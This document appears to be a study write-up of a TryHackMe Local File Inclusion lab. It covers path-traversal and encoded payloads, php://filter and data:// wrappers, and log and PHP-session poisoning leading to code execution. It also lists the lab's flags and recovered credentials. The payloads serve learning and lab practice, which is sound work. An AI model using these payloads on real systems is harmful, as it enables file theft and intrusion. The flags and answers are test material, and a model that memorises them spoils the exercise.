# Local File Inclusion

## Purpose

Local File Inclusion (LFI) is a web application vulnerability that allows an attacker to force an application to include or read files from the server's local file system. This note organizes the source material as an operational study reference for identifying LFI, understanding its risk, and practicing common exploitation chains in a controlled lab environment.

## What is a Local File Inclusion (LFI) vulnerability?

- **Local File Inclusion (LFI)** occurs when a web application includes a server-side local file based on user-controllable input.
- LFI is common in PHP applications when file inclusion functions are used without proper validation or sanitization:
  - `include`
  - `require`
  - `include_once`
  - `require_once`
- The vulnerability lets an attacker read local files that the web server process can access.
- Sensitive targets may include:
  - cryptographic keys
  - database files or configuration files containing credentials
  - private application data
  - operating system files
- The root problem is usually **untrusted user input**. Developers may need to include local content, but they should not allow users to directly control which file is loaded.
- A secure implementation should validate, constrain, and sanitize all user-controlled file paths.

## What is the risk of LFI?

- LFI can expose sensitive data when the targeted file is readable by the web server user.
- A successful LFI may reveal files that support further compromise, such as credentials, application secrets, or configuration data.
- LFI can sometimes be chained into **Remote Code Execution (RCE)**.
- RCE becomes possible when the attacker can place or inject executable code into a readable local file and then force the vulnerable application to include that file.

## Identifying and testing for LFI

### Entry points

- Attackers usually begin by identifying HTTP parameters that accept user input.
- Common entry points include:
  - `GET` parameters in URLs
  - `POST` parameters in forms or requests
  - other request-controlled values that influence server-side file loading
- Parameters are query strings or submitted values that the application uses to retrieve data or perform an action.
- Example search-style parameter:

```text
https://www.google.com/search?q=TryHackMe
```

![Identifying and testing for LFI](/assets/local-file-inclusion-101.png)

### Vulnerable PHP pattern

- After finding an entry point, determine how the application processes the supplied value.
- The source document shows a PHP example where a `GET` parameter named `file` is used to include file content.

![Identifying and testing for LFI](/assets/local-file-inclusion-102.png)

- A request to load a local file from the same directory may look like this:

```text
http://example.thm.labs/index.php?file=welcome.txt
```

### Testing local file access

- Once a file inclusion parameter is identified, test whether the application can read operating system files.
- On Linux systems, `/etc/passwd` is a common first test because it is usually readable.
- The source document identifies Linux system files as useful test targets for verifying local read access.

![Identifying and testing for LFI](/assets/local-file-inclusion-103.png)

### Common LFI payload styles

Use the simplest payload first, then adjust based on application behavior and filtering.

```text
http://example.thm.labs/page.php?file=/etc/passwd
http://example.thm.labs/page.php?file=../../../../../../etc/passwd
http://example.thm.labs/page.php?file=../../../../../../etc/passwd%00
http://example.thm.labs/page.php?file=....//....//....//....//etc/passwd
http://example.thm.labs/page.php?file=%252e%252e%252fetc%252fpasswd
```

Operational notes:

- A direct absolute path may work if the application does not restrict path input.
- Directory traversal with `../` attempts to escape the current application directory.
- The number of `../` sequences depends on the application path depth.
- Filter bypasses such as `....//` may work against weak path-normalization filters.
- URL encoding or double encoding can bypass filters that decode input inconsistently.
- After `/etc/passwd` succeeds, test other files relevant to the operating system, web server, language runtime, and application.

## Exploiting LFI

- Exploitation impact depends on server configuration, file permissions, and application design.
- Basic LFI may only allow file read access.
- More advanced chains can lead to RCE when PHP wrappers, logs, or session files can be controlled or poisoned.
- In PHP applications, supported wrappers can be abused to read or include data through alternate input/output streams.

## PHP filter

### Why PHP filters matter

- PHP files normally execute on the server, so their source code is not shown to the browser.
- The `php://filter` wrapper can make PHP source readable through encoding transformations.
- This is useful when an LFI lets you target PHP source files, but direct inclusion only executes the code.

### PHP filter examples

Read a local file through the filter wrapper:

```text
http://example.thm.labs/page.php?file=php://filter/resource=/etc/passwd
```

Encode output with ROT13 or base64:

```text
http://example.thm.labs/page.php?file=php://filter/read=string.rot13/resource=/etc/passwd
http://example.thm.labs/page.php?file=php://filter/convert.base64-encode/resource=/etc/passwd
```

Example base64 output from the source document:

```text
cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDox******Deleted
```

Decode base64 output locally or with a trusted decoder to recover the original plaintext.

## PHP data wrapper

- The PHP `data://` wrapper can include raw plaintext or base64-encoded data.
- In an LFI context, it can be used to include attacker-controlled text.
- The source example base64-encodes the phrase `AoC3 is fun!` and includes it through the vulnerable parameter.

![PHP DATA](/assets/local-file-inclusion-104.png)

Example payload:

```text
http://example.thm.labs/page.php?file=data://text/plain;base64,QW9DMyBpcyBmdW4hCg==
```

Operational implication:

- If the application can include attacker-controlled data as PHP, the attacker may be able to execute code.
- This is most useful when chained with a write or injection primitive that places executable PHP somewhere the application will include.

## LFI to RCE via log files

### Concept: log poisoning

- Log poisoning abuses application or service logs as the write location for malicious code.
- The attacker injects a payload into a log entry.
- The LFI then includes the poisoned log file.
- If the payload is interpreted as PHP, the server executes it.

Common places to inject payloads:

- Apache or web application logs through HTTP headers such as `User-Agent`
- SSH logs through crafted usernames
- application-specific logs that store user-controlled values

### Lab log behavior

- In the lab scenario, the web application records user requests in a log file accessible to the web server user.
- Authorized users can review the log page at:

```text
https://LAB_WEB_URL.p.thmlabs.com/logs.php
```

![LFI to RCE via Log files](/assets/local-file-inclusion-105.png)

The log page records four key values:

- username
- IP address
- `User-Agent`
- visited page

The `User-Agent` header is important because the client controls it. If the application logs it without sanitization, it can become an injection point.

### Confirming controlled log input

- Send a request with a controlled `User-Agent` value.
- Review the log page to confirm that the value appears in the server-side log.

![LFI to RCE via Log files](/assets/local-file-inclusion-106.png)

- After the request is sent, check whether the custom `User-Agent` value appears in the application log.

![LFI to RCE via Log files](/assets/local-file-inclusion-107.png)

### Injecting PHP through User-Agent

- Once log injection is confirmed, replace the benign `User-Agent` value with PHP code.
- The source material demonstrates this using terminal-based requests, though the same concept can be performed through a browser or web proxy such as Burp Suite.

![LFI to RCE via Log files](/assets/local-file-inclusion-108.png)

- Trigger the LFI against the log file so the PHP payload is loaded through the vulnerable include path.
- The important distinction is that the log file must be accessed through the LFI, not just opened as static text.

![LFI to RCE via Log files](/assets/local-file-inclusion-109.png)

Practice flow:

1. Inject PHP code into a controllable logged field such as `User-Agent`.
2. Confirm the log entry is written.
3. Use the LFI parameter to include the log file.
4. Verify code execution.
5. Use controlled command execution only in the authorized lab environment.

## LFI to RCE via PHP sessions

### Concept

- PHP session files store temporary user/session data on the operating system.
- LFI-to-session RCE follows the same general pattern as log poisoning:
  1. inject PHP code into a session-controlled value;
  2. identify the session file path;
  3. include the session file through LFI;
  4. execute the injected PHP code.

### Common PHP session storage locations

```text
c:\Windows\Temp
/tmp/
/var/lib/php5
/var/lib/php/session
```

### Session file discovery

- The technique requires enumeration of PHP configuration to identify the session storage path.
- The lab stores PHP session files in `/tmp`.
- PHP session file names usually follow this pattern:

```text
sess_<SESSION_ID>
```

- The `SESSION_ID` is commonly available in the browser cookie named `PHPSESSID`.
- Example from the source document:

```text
PHPSESSID=vc4567al6pq7usm2cufmilkm45
/tmp/sess_vc4567al6pq7usm2cufmilkm45
```

### Injecting code into the session

- In the lab, the application stores the username value in the PHP session even before full authentication.
- If the username field accepts PHP code and the session file can be included, it can become an RCE path.

![LFI to RCE via PHP Sessions](/assets/local-file-inclusion-110.png)

### Calling the session file through LFI

![LFI to RCE via PHP Sessions](/assets/local-file-inclusion-111.png)

Example LFI call to a PHP session file:

```text
https://LAB_WEB_URL.p.thmlabs.com/login.php?err=/tmp/sess_vc4567al6pq7usm2cufmilkm45
```

If the injected PHP code is stored in that session file and the vulnerable parameter includes it, the application may execute the code.

## Additional resources

- Review additional file inclusion material in the TryHackMe File Inclusion room if deeper practice is needed.

## Lab answers and operational walkthrough notes

### Entry point

Question: Deploy the attached VM and look around. What is the entry point for the web application?

```text
Base URL: https://10-10-97-228.p.thmlabs.com/index.php?err=error.txt
Answer: err
```

### Read `/etc/flag` through LFI

```text
https://10-10-97-228.p.thmlabs.com/index.php?err=/etc/flag
```

Flag:

```text
THM{d29e08941cf7fe41df55f1a7da6c4c06}
```

### Read `index.php` source through PHP filter

Request:

```text
https://10-10-97-228.p.thmlabs.com/index.php?err=php://filter/convert.base64-encode/resource=index.php
```

Returned data was base64 encoded. Decode it to reveal the source code and `$flag` value.

Answer:

```text
THM{791d43d46018a0d89361dbf60d5d9eb8}
```

### Read credentials from `creds.php`

The decoded `index.php` points to a credential file under `./includes/creds.php`.

Request:

```text
https://10-10-97-228.p.thmlabs.com/index.php?err=php://filter/convert.base64-encode/resource=./includes/creds.php
```

Returned base64:

```text
PD9waHAgCiRVU0VSID0gIk1jU2tpZHkiOwokUEFTUyA9ICJBMEMzMTVBdzNzMG0iOwo/
```

Decoded credential file:

```php
<?php
$USER = "McSkidy";
$PASS = "A0C315Aw3s0m";
?
```

![Lab answers and operational walkthrough notes](/assets/local-file-inclusion-112.png)

Credentials:

```text
Username: McSkidy
Password: A0C315Aw3s0m
```

### Recover the `flag.thm.aoc` server password

- Log in with the recovered credentials.
- Follow the password management link.

Answer:

```text
THM{552f313b52e3c3dbf5257d8c6db7f6f1}
```

![Lab answers and operational walkthrough notes](/assets/local-file-inclusion-113.png)

### LFI to RCE via log file

Question: The web application logs all users' requests, and only authorized users can read the log file. Use the LFI to gain RCE via the log file page. What is the hostname of the webserver?

Log file location:

```text
./includes/logs/app_access.log
```

Poison the log with a PHP payload in the `User-Agent` header:

```bash
curl -A "<?php phpinfo();?>" http://10-10-97-228.p.thmlabs.com/login.php
```

Then load the poisoned log through the LFI entry point:

```text
http://10-10-97-228.p.thmlabs.com/index.php?err=./includes/logs/app_access.log
```

![Lab answers and operational walkthrough notes](/assets/local-file-inclusion-114.png)

### Bonus: LFI to RCE via PHP sessions

- The current PHP configuration stores session files in `/tmp`.
- Use the `PHPSESSID` cookie value to construct the session filename.
- Inject PHP into a session-controlled field.
- Include the session file through the LFI parameter.

Example pattern:

```text
/tmp/sess_<PHPSESSID>
```

Operational reminder: session and log poisoning require a controlled lab or explicit authorization. In production, the same indicators should be treated as high-risk evidence of possible web compromise.
